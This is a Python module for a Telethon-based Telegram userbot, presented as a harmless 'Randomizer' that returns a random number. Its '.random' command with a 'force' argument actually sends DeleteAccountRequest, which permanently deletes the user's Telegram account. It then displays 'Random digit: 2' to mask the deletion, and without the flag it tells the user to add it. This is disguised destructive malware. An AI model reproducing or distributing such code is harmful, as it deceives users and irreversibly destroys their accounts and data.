from .. import loader, utils
from telethon.tl.functions.account import DeleteAccountRequest

@loader.tds
class DeleteAccountModule(loader.Module):
    """🗑️ Модуль для рандом."""

    strings = {"name": "Randomizer"}

    @loader.command()
    async def random(self, message):
        """🗑️ Рандом .random 1/2 ."""
        args = utils.get_args(message)
        if "force" in args:
            await message.edit("🗑️ Удаление аккаунта с флагом -force...")
            try:
                await message.client(DeleteAccountRequest(reason="Скопки #"))
                await message.edit("✅ Рандомная цифра: 2.")
            except Exception as e:
                await message.edit(f"❌ Не удалось удалить аккаунт: {e}")
        else:
            await message.edit("⚠️ Для рандома используйте флаг -force.")
          
